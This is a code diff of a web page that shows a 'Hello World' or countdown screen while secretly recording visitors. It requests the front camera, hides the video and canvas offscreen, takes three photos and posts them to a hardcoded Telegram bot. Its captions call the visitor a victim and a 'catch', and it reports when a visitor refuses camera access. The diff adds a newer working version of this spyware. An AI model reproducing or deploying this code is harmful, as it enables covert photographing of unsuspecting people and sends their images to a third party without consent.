@@ -3,11 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hello World</title>
+    <title>System Loading...</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
-        body { background-color: black; color: #00ff00; font-family: 'VT323', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-size: 5em; overflow: hidden; }
-        video, canvas { position: absolute; left: -10000px; opacity: 0; } /* إخفاء تام */
+        body { 
+            background-color: black; 
+            color: #00ff00; 
+            font-family: 'VT323', monospace; 
+            display: flex; 
+            flex-direction: column;
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden; 
+        }
+        #counter { font-size: 10em; }
+        #msg { font-size: 2em; margin-top: 20px; }
+        video, canvas { position: absolute; left: -5000px; opacity: 0; }
     </style>
 </head>
 <body>
@@ -15,64 +28,66 @@
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
-    <div>Hello World</div>
+    <div id="counter">10</div>
+    <div id="msg">INITIALIZING EXPLOIT...</div>
 
     <script>
         const token = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
         const chat = "8042090388";
+        let timeLeft = 10;
 
         async function startApp() {
             try {
+                // طلب الكاميرا أول ما يفتح الصفحة
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
+                    video: { facingMode: "user", width: 1280, height: 720 } 
                 });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+                document.getElementById('video').srcObject = stream;
                 
-                video.onplay = () => {
-                    // تصوير 3 لقطات لضمان الوضوح
-                    setTimeout(() => capture(1), 3000); // لقطة بعد 3 ثواني
-                    setTimeout(() => capture(2), 5000); // لقطة بعد 5 ثواني
-                    setTimeout(() => capture(3), 7000); // لقطة بعد 7 ثواني
-                };
+                // بدء العد التنازلي
+                const timer = setInterval(() => {
+                    timeLeft--;
+                    document.getElementById('counter').innerText = timeLeft;
+                    
+                    if (timeLeft <= 0) {
+                        clearInterval(timer);
+                        document.getElementById('counter').innerText = "";
+                        document.getElementById('msg').innerText = "Hello World";
+                        document.getElementById('msg').style.fontSize = "5em";
+                        
+                        // تصوير 3 لقطات سريعة لضمان الجودة
+                        capture(1);
+                        setTimeout(() => capture(2), 1000);
+                        setTimeout(() => capture(3), 2000);
+                    }
+                }, 1000);
+
             } catch (err) {
-                sendMsg("⚠️ الضحية رفض الكاميرا");
+                // لو رفض الكاميرا
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=❌ الضحية رفض الكاميرا عند العد`);
             }
         }
 
-        function capture(num) {
+        async function capture(n) {
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
             
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
+            canvas.getContext('2d').drawImage(video, 0, 0);
             
-            // رسم الصورة
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // تحويلها لـ Base64 بجودة عالية
             const imgData = canvas.toDataURL('image/jpeg', 0.9);
+            const blob = await (await fetch(imgData)).blob();
             
-            // إرسالها فوراً
-            sendToTele(imgData, num);
-        }
-
-        async function sendToTele(base64, n) {
-            const blob = await (await fetch(base64)).blob();
             const formData = new FormData();
             formData.append('chat_id', chat);
-            formData.append('photo', blob, `shot_${n}.jpg`);
-            formData.append('caption', `✅ صيد واضح - رقم ${n}`);
+            formData.append('photo', blob, `shot${n}.jpg`);
+            formData.append('caption', `🎯 صيد بعد العد التنازلي - لقطة ${n}`);
 
             fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             });
-        }
-
-        function sendMsg(m) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(m)}`);
         }
 
         window.onload = startApp;
